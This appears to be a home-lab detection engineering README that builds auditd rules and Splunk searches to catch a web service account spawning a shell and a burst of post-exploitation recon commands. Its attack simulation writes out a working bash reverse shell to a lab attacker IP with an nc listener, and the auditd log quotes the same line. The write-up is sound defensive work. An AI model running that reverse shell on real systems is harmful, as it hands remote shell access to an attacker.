# Project 06  — Process Execution Analytics

## Overview

This project builds behavioral detections around process execution patterns — specifically the parent-child relationships between processes that reveal attacker behavior. Where Projects 1-5 detected WHAT ran, Project 6 detects WHO spawned it. A reverse shell executing from `/tmp` is suspicious. A reverse shell spawned by a web server process is a confirmed compromise. The parent-child relationship is the fingerprint of the attack technique.

Three detections were built: a high-confidence service account shell spawn detector, a post-exploitation recon chain analytic, and a multi-signal behavioral composite that correlates both signals within a single session.

## Environment

| Component | Details |
|---|---|
| Host | Ubuntu Server 24.04 (splunk-server) |
| Hypervisor | Proxmox VE 9.1.1 on Dell OptiPlex 7060 Micro |
| Attacker | Kali Linux (VM 100) — 10.10.10.132 |
| SIEM | Splunk Enterprise 10.2.2 |
| Log Source | auditd → Splunk Universal Forwarder → index=main |
| auditd Rules | 62 total (7 net new this project) |

## Project Metrics

| Metric | Value |
|---|---|
| Detections Built | 3 |
| auditd Rules Added | 7 |
| Attack Simulations Run | 2 |
| Splunk Alerts Saved | 3 |
| MITRE Techniques Covered | 4 |
| Detection Confidence Range | 0.75 – 1.0 |

## Why This Project Matters

Process execution analytics represents a maturity leap over signature-based detection. Any attacker can change their tool, rename their binary, or obfuscate their payload. They cannot change the fundamental behavior of exploiting a web server to get a shell — the parent-child relationship between `www-data` and `bash` is structural, not cosmetic. This project builds detections that survive tool substitution because they target behavior, not artifacts.

The combined behavioral score in Detection 3 demonstrates the core detection engineering principle: single signals are informative, correlated signals are confirmatory. A service account spawning a shell is suspicious. That same session immediately running recon commands is an attacker.

---

## Phase 1 — Infrastructure

### New auditd Rules

Seven rules added across three new keys:

```bash
# Watch for shell spawns under service account UIDs (www-data=33)
sudo auditctl -a always,exit -F arch=b64 -S execve -F uid=33 -k svc_shell_spawn
sudo auditctl -a always,exit -F arch=b32 -S execve -F uid=33 -k svc_shell_spawn

# Watch bash/sh/dash/zsh/ksh binary execution directly
sudo auditctl -a always,exit -F arch=b64 -S execve -F exe=/bin/bash -k shell_spawn
sudo auditctl -a always,exit -F arch=b64 -S execve -F exe=/bin/sh -k shell_spawn
sudo auditctl -a always,exit -F arch=b64 -S execve -F exe=/usr/bin/dash -k shell_spawn

# General process execution anchor for session-level correlation
sudo auditctl -a always,exit -F arch=b64 -S execve -F auid!=4294967295 -k proc_exec
sudo auditctl -a always,exit -F arch=b32 -S execve -F auid!=4294967295 -k proc_exec
```

**Key design decisions:**
- `svc_shell_spawn` watches `uid=33` (www-data) directly — narrow scope, high confidence
- `shell_spawn` watches specific shell binaries by exe path — catches the child process
- `proc_exec` uses `auid!=4294967295` to filter daemon processes — only watches real logged-in user sessions
- `shell_spawn` is intentionally broad at the auditd level; filtering happens in SPL

### Rule Persistence

```bash
sudo auditctl -l | sudo tee /etc/audit/rules.d/blip-ai.rules > /dev/null
sudo systemctl restart auditd
sudo auditctl -l | wc -l
# Expected: 62
```

---

## Phase 2 — Attack Simulations

### Attack 1 — Service Account Shell Spawn (Web Shell Exploitation Pattern)

Simulates a web server process spawning a reverse shell — the result of successful web shell exploitation. The `www-data` user (uid=33) is the Apache/Nginx service account and has no legitimate reason to spawn interactive shells.

```bash
# Kali — start listener
nc -lvnp 4444

# Ubuntu — simulate web shell exploitation
sudo -u www-data bash -c 'bash -i >& /dev/tcp/10.10.10.132/4444 0>&1'
```

<img width="812" height="71" alt="Screenshot 2026-05-17 at 5 56 36 PM" src="https://github.com/user-attachments/assets/7dfadeb4-52b2-4ab4-a7fc-db81967d7911" />


**What auditd recorded:**
```
pid=1763982  uid=33  bash -c "bash -i >& /dev/tcp/10.10.10.132/4444 0>&1"
pid=1763983  uid=33  bash -i          ← interactive shell child
pid=1763984  uid=33  groups           ← post-spawn enumeration
```

The full process family tree captured — each child's ppid matches the previous row's pid. All three tagged `uid=33`.

### Attack 2 — Post-Exploitation Recon Chain

Simulates an attacker enumerating the system immediately after landing a shell. The rapid-fire cadence — five commands in under 13 milliseconds — is the behavioral signature.

```bash
/usr/bin/id
/usr/bin/whoami
/usr/bin/hostname
/usr/bin/uname -a
/usr/bin/ps aux
```

**Key observation:** Using full binary paths guarantees kernel EXECVE syscalls and therefore auditd records. Shell built-ins do not generate records.

---

## Phase 3 — Detections

### Detection 1 — Service Account Shell Spawn

**Description:** Detects interactive shell processes (bash, sh, dash, zsh, ksh) executing under service account uid=33 (www-data) with a real TTY. Web server processes have no legitimate reason to spawn interactive shells.

**MITRE:** T1059.004 — Unix Shell, T1190 — Exploit Public-Facing Application

**Confidence:** 0.90 CRITICAL

**Why 0.90:** www-data spawning bash has virtually zero legitimate explanation. The `tty!=(none)` filter ensures we only fire on interactive sessions, not daemon housekeeping. The shell binary regex ensures implementation matches description.

```spl
index=main sourcetype=linux_audit earliest=-60m
"svc_shell_spawn" "type=SYSCALL"
| rex field=_raw "ppid=(?P<ppid>\d+)"
| rex field=_raw " pid=(?P<pid>\d+)"
| rex field=_raw " uid=(?P<uid>\d+)"
| rex field=_raw "auid=(?P<auid>\d+)"
| rex field=_raw "ses=(?P<ses>\d+)"
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| rex field=_raw "exe=\"(?P<exe>[^\"]+)\""
| rex field=_raw "tty=(?P<tty>\S+)"
| rex field=_raw "success=(?P<success>\w+)"
| where success="yes" OR success="1"
| where uid=33
| where tty!="(none)"
| where match(exe,"/(bash|sh|dash|zsh|ksh)$")
| eval detection="Service Account Shell Spawn"
| eval confidence=0.90
| eval severity="CRITICAL"
| eval description="www-data (uid=33) spawned an interactive shell — web shell exploitation pattern"
| stats
    count as event_count
    values(comm) as processes_spawned
    values(exe) as binaries_executed
    min(_time) as first_seen
    max(_time) as last_seen
    by auid ses host confidence severity detection description
| eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S")
| eval last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
| table detection severity confidence auid ses host event_count processes_spawned binaries_executed first_seen last_seen description
```

<img width="1321" height="635" alt="Screenshot 2026-05-17 at 6 10 27 PM" src="https://github.com/user-attachments/assets/36331a21-433d-4ce0-8e32-5e6dc2551939" />
<img width="1270" height="805" alt="Screenshot 2026-05-17 at 6 16 53 PM" src="https://github.com/user-attachments/assets/cda0780a-97a5-45ba-b280-f21e78842218" />

**Alert Settings:**
- Title: `Service Account Shell Spawn Detected`
- Permissions: Shared in App
- Alert type: Scheduled — `*/5 * * * *`
- Time Range: Last 60 minutes
- Expires: 24 hours
- Trigger: Number of Results greater than 0 — Per-Result
- Throttle: 600 seconds
- Severity: Critical

---

### Detection 2 — Shell Spawn from Unusual Parent (Deferred)

**Status: Not built as standalone — telemetry feeds Detection 3**

The `shell_spawn` key was evaluated but the diagnostic showed the only high-confidence interactive signal (uid=33, tty=pts1) is fully covered by Detection 1. Remaining shell activity is Splunk internals (uid=1001), system daemons, and service wrappers. Without robust parent lineage filtering (apache2→bash, nginx→sh, php-fpm→bash), this detection becomes "a shell happened" — overlapping Detection 1 without adding coverage.

**V2 improvement:** Add parent process classification. When process lineage data is available (apache2, nginx, php-fpm, java, python, perl, node spawning shells), this becomes a standalone HIGH confidence detection.

---

### Detection 3 — Post-Exploitation Recon Chain

**Description:** Detects 3 or more distinct post-exploitation reconnaissance commands executing within a 60-second window in the same session. Rapid-fire enumeration cadence (id, whoami, hostname, uname, ps, etc.) indicates an attacker getting their bearings after landing a shell.

**MITRE:** T1082 — System Information Discovery, T1033 — System Owner/User Discovery, T1057 — Process Discovery

**Confidence:** 0.75 HIGH

**Why 0.75:** Individual recon commands are run legitimately by admins. The behavioral signal is the combination — 3+ distinct commands within 60 seconds in the same session. Legitimate admin work doesn't produce this cadence. Splunk binary exclusion (`NOT match(exe,"^/opt/splunk")`) prevents Splunk's own startup sequence from triggering false positives.

```spl
index=main sourcetype=linux_audit earliest=-60m
"proc_exec" "type=SYSCALL"
| rex field=_raw "auid=(?P<auid>\d+)"
| rex field=_raw "ses=(?P<ses>\d+)"
| rex field=_raw " uid=(?P<uid>\d+)"
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| rex field=_raw "exe=\"(?P<exe>[^\"]+)\""
| rex field=_raw "tty=(?P<tty>\S+)"
| rex field=_raw "success=(?P<success>\w+)"
| where success="yes" OR success="1"
| where auid=1000
| where auid!=4294967295
| where tty!="(none)"
| where match(comm,"^(id|whoami|hostname|uname|ps|netstat|cat|find|getent|w|who|last|ifconfig|ip|arp|ss)$")
| where NOT match(exe,"^/opt/splunk")
| eval recon_window=floor(_time/60)
| stats
    dc(comm) as distinct_commands
    values(comm) as commands_run
    min(_time) as first_seen
    max(_time) as last_seen
    by auid ses host recon_window
| where distinct_commands >= 3
| eval detection="Post-Exploitation Recon Chain Detected"
| eval confidence=0.75
| eval severity="HIGH"
| eval description="3+ distinct recon commands executed within 60 seconds — post-exploitation enumeration pattern"
| eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S")
| eval last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
| table detection severity confidence auid ses host distinct_commands commands_run first_seen last_seen description
```

<img width="1270" height="953" alt="Screenshot 2026-05-27 at 5 30 38 PM" src="https://github.com/user-attachments/assets/875d5264-26ce-438c-8788-dcd159c44b29" />


**Alert Settings:**
- Title: `Post-Exploitation Recon Chain Detected`
- Permissions: Shared in App
- Alert type: Scheduled — `*/5 * * * *`
- Time Range: Last 60 minutes
- Expires: 24 hours
- Trigger: Number of Results greater than 0 — Per-Result
- Throttle: 600 seconds
- Severity: High

---

### Detection 4 — Combined Process Anomaly Score

**Description:** Correlates service account shell spawn and post-exploitation recon chain signals within the same session. Two or more distinct attack-phase techniques detected together indicates a high-confidence attacker behavioral pattern — not coincidence.

**MITRE:** T1059.004 — Unix Shell, T1190 — Exploit Public-Facing Application, T1082 — System Information Discovery, T1033 — System Owner/User Discovery

**Confidence:** 1.0 CRITICAL (when both techniques present)

**Why 1.0:** A web server spawning a shell AND that same session immediately running recon commands is a complete attack chain. The probability of both occurring legitimately in the same session approaches zero. Session scoping (`by auid ses host`) ensures we're correlating within the same login session, not across unrelated activity.

```spl
index=main sourcetype=linux_audit earliest=-60m
("svc_shell_spawn" OR "proc_exec") AND "type=SYSCALL"
| rex field=_raw "auid=(?P<auid>\d+)"
| rex field=_raw "ses=(?P<ses>\d+)"
| rex field=_raw " uid=(?P<uid>\d+)"
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| rex field=_raw "exe=\"(?P<exe>[^\"]+)\""
| rex field=_raw "tty=(?P<tty>\S+)"
| rex field=_raw "success=(?P<success>\w+)"
| rex field=_raw "key=\"(?P<key>[^\"]+)\""
| where success="yes" OR success="1"
| where auid!=4294967295
| where tty!="(none)"
| eval technique=case(
    key="svc_shell_spawn" AND uid=33 AND match(exe,"/(bash|sh|dash|zsh|ksh)$"), "service_shell_spawn",
    key="proc_exec" AND match(comm,"^(id|whoami|hostname|uname|ps|netstat|cat|find|getent|w|who|last|ifconfig|ip|arp|ss)$") AND NOT match(exe,"^/opt/splunk"), "recon_command",
    true(), null()
)
| where isnotnull(technique)
| stats
    dc(technique) as technique_count
    values(technique) as techniques_detected
    sum(eval(case(technique="service_shell_spawn",0.90,technique="recon_command",0.75,true(),0))) as raw_score
    min(_time) as first_seen
    max(_time) as last_seen
    by auid ses host
| where technique_count >= 2
| eval combined_confidence=min(round(raw_score/technique_count * 1.25, 2), 1.0)
| eval severity=case(combined_confidence>=0.90,"CRITICAL",combined_confidence>=0.75,"HIGH",true(),"MEDIUM")
| eval detection="Combined Process Anomaly — Multi-Signal Behavioral Score"
| eval description="Multiple attack-phase signals detected in same session: service account shell spawn + post-exploitation recon chain. High-confidence attacker behavioral pattern."
| eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S")
| eval last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
| table detection severity combined_confidence auid ses host technique_count techniques_detected first_seen last_seen description
```

<img width="1270" height="953" alt="Screenshot 2026-05-27 at 5 35 30 PM" src="https://github.com/user-attachments/assets/3a263b9b-de51-4bbf-9001-da82ec3404a9" />

<img width="1270" height="446" alt="Screenshot 2026-05-27 at 5 35 34 PM" src="https://github.com/user-attachments/assets/b18acd39-494f-4622-88b3-bf51689b03be" />


**Alert Settings:**
- Title: `Combined Process Anomaly — Multi-Signal Behavioral Score`
- Permissions: Shared in App
- Alert type: Scheduled — `*/5 * * * *`
- Time Range: Last 60 minutes
- Expires: 24 hours
- Trigger: Number of Results greater than 0 — Per-Result
- Throttle: 600 seconds
- Severity: Critical

---

## Phase 4 — Validation

All detections confirmed with real attack data:

| Detection | Attack Run | auditd Verified | Splunk Result | Eva Approved |
|---|---|---|---|---|
| 1 — Service Account Shell Spawn | ✅ | ✅ uid=33 chain confirmed | ✅ 1 row, 4 events | ✅ |
| 2 — Shell Spawn from Unusual Parent | N/A | N/A | Deferred to D4 | ✅ skip confirmed |
| 3 — Post-Exploitation Recon Chain | ✅ | ✅ 5 cmds in 13ms | ✅ 2 rows | ✅ |
| 4 — Combined Process Anomaly Score | ✅ | ✅ both techniques | ✅ 1 row CRITICAL 1.0 | ✅ |

---

## Known Limitations

| Limitation | Impact | V2 Fix |
|---|---|---|
| uid=33 hardcoded | Only catches www-data; misses other service accounts (nginx=101, postgres=113) | Expand to all non-interactive service UIDs |
| No parent process classification | Cannot confirm apache2→bash lineage without ppid→comm lookup | Add ppid correlation join to identify parent binary |
| proc_exec broad scope | Captures all labadmin executions — high volume, SPL filtering required | Scope to specific suspicious parent UIDs |
| Detection 2 deferred | No standalone shell lineage detection | Add apache2/nginx/php-fpm parent filtering |
| sum() inflation in D4 | Repeated recon commands inflate raw_score | Replace sum() with max() per technique before aggregation |
| auid=1000 hardcoded in D3 | Only catches labadmin recon; misses other users | Expand to all interactive auid values |

---

## MITRE ATT&CK Mapping

| Technique | ID | Detection |
|---|---|---|
| Unix Shell | T1059.004 | Detection 1, 4 |
| Exploit Public-Facing Application | T1190 | Detection 1, 4 |
| System Information Discovery | T1082 | Detection 3, 4 |
| System Owner/User Discovery | T1033 | Detection 3, 4 |
| Process Discovery | T1057 | Detection 3, 4 |

---
